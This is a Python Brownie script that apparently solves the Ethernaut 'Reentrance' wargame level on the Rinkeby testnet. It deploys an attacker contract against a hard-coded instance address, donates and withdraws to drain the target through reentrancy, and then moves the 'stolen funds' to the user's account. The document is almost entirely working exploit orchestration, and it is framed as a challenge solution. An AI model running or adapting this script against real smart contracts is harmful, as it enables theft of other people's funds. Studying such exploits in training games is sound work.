from brownie import accounts, Reentrance, ReentranceAttacker
from web3 import Web3

eth_amount = Web3.toWei("0.001", "ether")

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x045C31B049cc714eD43008745592feBB782F646e"
reentrance = Reentrance.at(instance_address)

# --------------------------------------------------------------------------
# The goal of this level is for you to steal all the funds from the contract.
# --------------------------------------------------------------------------


def level_completed():
    return reentrance.balance() == 0


def exploit():
    # view all funds in contract
    print(f"Contract has a balance of: {reentrance.balance()}")

    # deploy hacker contract
    hacker = ReentranceAttacker.deploy(instance_address, {"from": account})

    # call donate function from hacker contract
    tx = hacker.donate(hacker.address, {"from": account, "value": eth_amount})
    tx.wait(1)

    # call withdraw function from hacker contract
    tx = hacker.withdraw({"from": account})
    tx.wait(1)

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")

    # send stolen funds from contract to eoa account
    print("Recovering stolen funds...")
    tx = hacker.recoverFunds({"from": account})
    tx.wait(1)

    # confirm we have successfully recovered funds
    if hacker.balance() == 0:
        print(f"Funds have been recovered...")
    else:
        print("Funds have not been recovered...")


def main():
    exploit()
